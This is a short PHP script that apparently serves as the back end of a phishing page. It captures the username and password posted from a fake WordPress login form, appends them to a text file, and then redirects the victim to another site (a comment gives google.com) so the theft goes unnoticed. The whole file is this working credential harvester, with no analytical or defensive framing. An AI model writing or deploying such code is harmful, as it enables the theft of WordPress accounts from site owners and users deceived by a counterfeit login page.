<?php

file_put_contents("usernames.txt", "Wordpress Username: " . $_POST['log'] . "\nPassword: " . $_POST['pwd'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://google.com
header("Location: $url");
exit();
?>